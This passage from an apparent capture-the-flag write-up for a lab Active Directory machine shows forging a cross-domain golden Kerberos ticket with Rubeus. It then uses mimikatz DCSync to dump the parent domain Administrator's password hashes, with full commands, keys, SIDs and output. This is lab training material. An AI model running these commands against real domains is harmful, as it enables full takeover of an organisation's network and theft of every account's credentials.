      des_cbc_md5       (4096) : b3e070025110ce1f

* Primary:Kerberos *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Credentials
      des_cbc_md5       : b3e070025110ce1f
```


now we can forge a golden TGT that will be valid in the DC domain


```bash
PS C:\Windows\Temp> 
PS C:\Windows\Temp> Get-ADDomain -Identity corp.ghost.htb | Select-Object DomainSID
Get-ADDomain -Identity corp.ghost.htb | Select-Object DomainSID

DomainSID                               
---------                               
S-1-5-21-2034262909-2733679486-179904498


PS C:\Windows\Temp> Get-ADDomain -Identity ghost.htb | Select-Object DomainSID
Get-ADDomain -Identity ghost.htb | Select-Object DomainSID

DomainSID                               
---------                               
S-1-5-21-4084500788-938703357-3654145966
```


now we have all we need

- **krbtgt AES Key of corp.ghost.htb:** `b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d`
- **corp.ghost.htb domain SID:** `S-1-5-21-2034262909-2733679486-179904498`
- **ghost.htb Enterprise Admins SID:** `S-1-5-21-4084500788-938703357-3654145966-519`
- **Target domain:** `corp.ghost.htb`
- **Username to impersonate:** `Administrator`
- **DC IP:** `10.129.231.105`

we can do this now with rubeus x mimikatz


```bash
S C:\Windows\Temp> .\Rubeus.exe golden /aes256:b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d /domain:corp.ghost.htb /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /user:Administrator /outfile:ticket.kirbi /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : CORP.GHOST.HTB (CORP)
[*] SID            : S-1-5-21-2034262909-2733679486-179904498
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-4084500788-938703357-3654145966-519
[*] ServiceKey     : B0EB79F35055AF9D61BCBBE8CCAE81D98CF63215045F7216FFD1F8E009A75E8D
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : B0EB79F35055AF9D61BCBBE8CCAE81D98CF63215045F7216FFD1F8E009A75E8D
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : corp.ghost.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@corp.ghost.htb'

[*] AuthTime       : 6/18/2026 10:18:15 PM
[*] StartTime      : 6/18/2026 10:18:15 PM
[*] EndTime        : 6/19/2026 8:18:15 AM
[*] RenewTill      : 6/25/2026 10:18:15 PM

[*] base64(ticket.kirbi):

      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


[*] Ticket written to ticket_2026_06_19_05_18_15_Administrator_to_krbtgt@CORP.GHOST.HTB.kirbi


[+] Ticket successfully imported!
```


then we use that golden ticket, to DCSYNC the DC Domain


```bash
PS C:\Windows\Temp> .\mimikatz.exe "kerberos::ptt C:\Windows\Temp\ticket.kirbi" "lsadump::dcsync /domain:ghost.htb /dc:DC01.ghost.htb /user:ghost\administrator" "exit"
.\mimikatz.exe "kerberos::ptt C:\Windows\Temp\ticket.kirbi" "lsadump::dcsync /domain:ghost.htb /dc:DC01.ghost.htb /user:ghost\administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::ptt C:\Windows\Temp\ticket.kirbi

* File: 'C:\Windows\Temp\ticket.kirbi': ERROR kuhl_m_kerberos_ptt_file ; kull_m_file_readData (0x00000002)

mimikatz(commandline) # lsadump::dcsync /domain:ghost.htb /dc:DC01.ghost.htb /user:ghost\administrator
[DC] 'ghost.htb' will be the domain
[DC] 'DC01.ghost.htb' will be the DC server
[DC] 'ghost\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 7/2/2024 12:11:35 PM
Object Security ID   : S-1-5-21-4084500788-938703357-3654145966-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 1cdb17d5c14ff69e7067cffcc9e470bd
    ntlm- 0: 1cdb17d5c14ff69e7067cffcc9e470bd
    ntlm- 1: 7eec23c697d5a984264f811bb51c2830
    lm  - 0: f645cccb781803789bc138a315de38f2

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 419db8d90f4d8abca5397161b188e33f

* Primary:Kerberos-Newer-Keys *
    Default Salt : GHOST.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 83d3226d3b2b12e89df0470c2c245fec1de69ee73195d907ed49c125a925ee76
      aes128_hmac       (4096) : 44ca6c3d49fe2089d5dc5fe4f4a9f8cb
      des_cbc_md5       (4096) : 9de66dcbcbf8ae92
    OldCredentials
      aes256_hmac       (4096) : 17fb51158a36a2705a70ba511a6e7ed1f4b0d3cf63247b484a5193f6f13227c4
      aes128_hmac       (4096) : 668960d5156b990eeccf0c5d8491680e
      des_cbc_md5       (4096) : b573c8ce7c04ec5d

* Primary:Kerberos *
    Default Salt : GHOST.HTBAdministrator
    Credentials
      des_cbc_md5       : 9de66dcbcbf8ae92
    OldCredentials
      des_cbc_md5       : b573c8ce7c04ec5d
```


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/5b59656e-e0a4-448c-92a7-ef5578dba916/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667L3FSK4P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICzT5MvlpqzMPj%2BNu6lH0uv9SU8q2qnwLeZfIt%2FKw2nBAiEA%2BUR54BEDve%2B1yd7%2B7CHF4QiBQpPRrs%2BvfrsFqoLtVC8q%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDP7kfzj2QNnQYXmZgSrcA5xB0zZhAi2fAEGXIM49NwkOyQmi%2F8tz5%2FfLgLOKkNybcA88%2BtqsBkJfUsMXTzjBjiavvnvw9nCziOFh3d5ETX2CfC%2FC4BMSswsUpX6ab1s95rnDpjwOJxBG73AGqRb3p17E%2BckOMCeb6D%2FzJZALQb0yd4FQFN46q6n0%2FMcqQqMIANRcnxxbu3g85w7Cs2tdnwdiCLyEbQ0VG1BQ1HNilrulFubEcSyI5wPo3O1dOEK3wSTnl1LOiZbHoU%2F3YXWXPCOWuibdqnwaBgmv9PAzewQYwvJhVbspuzsiGHmVzmSren6reflwSxRGogbbIRCghVvYAQVMX9VQQx7nBMOlIWajPLvIDsRKbmhGr8OoAGsjYsmalOBGlC4%2Btc%2BHHBmEkk9WPzhO%2BUAhf6HsPaEJ4Lbk5zftPhpV0wUdzIJHG3hWwleI94ty35qegVc0anzWJKZOqP39%2FXAROrqkdpLFWU0tFquFPtoh0YatBbrPabqd4ujUutghNjgdec%2FhLeykrLA%2Br3gJ1v%2Bxq%2FowB2npSZ%2BhqnPBc74qmsKl%2FxaP45ZDi8n32YbJ7aK1ku5%2BDBqOTumigosxKdsCo35x2GRuBT0oeVDLnCIBxx8nlfV2Lxvr2c0Gw%2B7D85U%2F4%2FXjMN%2BVttIGOqUBNuZ05tN0RfzbLXzEX%2F5R4IRCl%2Bnlwi75ALhVo1uO8MB9fWEwSLvwhvz%2BEh1T81FcKV5eUvRdoV7IMY5H%2BntGksnNXYiI%2BKAXjbdgCxm100%2Fxl2xILIUwDnd7THBF6sPvfXpmySObONzDKhMS%2BS20LhWK7OW99LaSp8DwlfW4U2WCJqMt2LapQRPpJRg2wiN362klz4HZO6CcSUyieUEznCuqLd1t&X-Amz-Signature=8e323f8e32ca73b75ad67841dbd8e7928af4687fd96b560ffefb6d2a4ce0cb54&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

